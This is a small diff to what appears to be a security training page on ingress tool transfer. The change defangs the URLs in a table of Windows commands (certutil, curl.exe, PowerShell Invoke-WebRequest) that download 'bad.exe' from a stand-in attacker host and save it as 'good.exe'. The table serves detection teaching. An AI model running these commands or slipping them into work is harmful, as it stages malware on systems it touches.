@@ -228,9 +228,9 @@ Common Transfer Methods 
 |   |   |
 |---|---|
 |Ingress Tool Transfer Command|Common CMD / PowerShell Commands|
-|Via Certutil|certutil.exe -urlcache -f [https://blackhat.thm/bad.exe] good.exe|
-|Via Curl (Windows 10+)|curl.exe [https://blackhat.thm/bad.exe] -o good.exe|
-|Via PowerShell [IWR](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest)|powershell -c "Invoke-WebRequest -Uri '[https://blackhat.thm/bad.exe]' -OutFile 'good.exe'"|
+|Via Certutil|certutil.exe -urlcache -f [hxxps://blackhat[.]thm/bad[.]exe] good.exe|
+|Via Curl (Windows 10+)|curl.exe [hxxps://blackhat[.]thm/bad[.]exe] -o good.exe|
+|Via PowerShell [IWR](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest)|powershell -c "Invoke-WebRequest -Uri '[hxxps://blackhat[.]thm/bad[.]exe]' -OutFile 'good.exe'"|
 |Via Graphical Interface|No need to use CMD, just copy-paste malware via RDP or download them via a web browser!|
 
 Detecting Tools Transfer 
